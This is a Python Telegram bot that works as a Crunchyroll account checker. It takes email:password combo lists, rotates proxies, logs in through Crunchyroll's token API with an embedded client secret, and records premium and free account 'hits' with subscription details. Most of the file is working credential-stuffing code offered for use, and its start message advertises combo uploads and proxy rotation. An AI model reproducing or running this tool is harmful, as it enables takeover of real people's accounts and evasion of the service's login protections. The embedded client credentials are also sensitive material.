import os
import asyncio
import uuid
import random
import aiohttp
from aiogram import Bot, Dispatcher, types
from aiogram.types import FSInputFile
from aiogram.filters import Command
from aiogram import F

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    print("Error: BOT_TOKEN is not set!")
    exit(1)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

checker = None
proxies = []
stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0}

class CrunchyrollChecker:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.proxy_index = 0
        self.countries = {
            "AF": "Afghanistan 🇦🇫", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",  # Add more countries as needed...
            "US": "United States 🇺🇸"
        }

    def get_proxy(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.proxy_index % len(self.proxies)]
        self.proxy_index += 1
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}

    async def check(self, email, password):
        try:
            device_id = str(uuid.uuid4())
            async with aiohttp.ClientSession() as session:
                proxy = self.get_proxy()
                if proxy:
                    session._default_headers.update({"Proxy": proxy})

                url = "https://beta-api.crunchyroll.com/auth/v1/token"
                headers = {
                    'host': 'beta-api.crunchyroll.com',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
                }

                data = {
                    'grant_type': 'password',
                    'username': email,
                    'password': password,
                    'scope': 'offline_access',
                    'client_id': 'y2arvjb0h0rgvtizlovy',
                    'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
                    'device_type': 'Baron',
                    'device_id': device_id,
                    'device_name': 'Baron'
                }

                async with session.post(url, headers=headers, data=data, timeout=15) as response:
                    response_text = await response.text()

                if any(x in response_text for x in ["invalid_credentials", "force_password_reset", "too_many_requests", "401", "400", "missing_required_field"]):
                    return {'status': 'INVALID', 'email': email}

                if '"access_token"' not in response_text:
                    return {'status': 'INVALID', 'email': email}

                access_token = await response.json()

                headers = {
                    'authorization': f'Bearer {access_token}',
                    'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
                }

                async with session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=15) as response:
                    account_data = await response.json()

                email_verified = account_data.get('email_verified', False)
                created = account_data.get('created', '').split('T')[0]
                external_id = account_data.get('external_id')

                async with session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products', headers=headers, timeout=15) as response:
                    products_data = await response.json()

                plan = "Free"
                currency = "N/A"
                subscribable = "False"
                free_trial = "False"

                if 'items' in products_data and len(products_data['items']) > 0:
                    item = products_data['items'][0]
                    plan = item.get('product', {}).get('sku', 'Unknown')
                    currency = item.get('currency_code', 'N/A')
                    subscribable = str(item.get('product', {}).get('is_subscribable', False))
                    free_trial = str(item.get('active_free_trial', False))

                async with session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}', headers=headers, timeout=15) as response:
                    sub_data = await response.json()

                expiry = sub_data.get('next_renewal_date', 'N/A')
                if expiry and 'T' in expiry:
                    expiry = expiry.split('T')[0]

                plan_duration = sub_data.get('cycle_duration', 'N/A')
                is_active = str(sub_data.get('is_active', False))
                country_code = sub_data.get('country_code', 'US')
                country = self.countries.get(country_code, f"{country_code} 🌍")
                is_cancelled = sub_data.get('is_cancelled', False)

                if is_cancelled or subscribable == "False" or "Subscription Not Found" in str(sub_data):
                    status = "FREE"
                elif subscribable == "True":
                    status = "PREMIUM"
                else:
                    status = "FREE"

                return {
                    'status': status,
                    'email': email,
                    'password': password,
                    'email_verified': email_verified,
                    'account_creation_date': created,
                    'plan': plan,
                    'currency': currency,
                    'subscribable': subscribable,
                    'free_trial': free_trial,
                    'expiry': expiry,
                    'plan_duration': plan_duration,
                    'active': is_active,
                    'country': country
                }

        except Exception as e:
            return {'status': 'ERROR', 'email': email, 'message': str(e)}

@dp.message(Command("start"))
async def start(message: types.Message):
    await message.answer(
        "Crunchyroll premium checker\n\n"
        "Bot made by @Sudhakaran12\n\n"
        "📌 Features:\n"
        "• Upload Combos.txt file (email:password format)\n"
        "• Or paste combos directly\n"
        "• Use /check to check accounts\n"
        "• /proxies to load proxy file\n"
        "• Fast mode with proxy rotation\n"
        "• Premium & Free hits saved with full details"
    )


async def main():
    global checker
    checker = CrunchyrollChecker(proxies)
    print("✅ Bot started")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
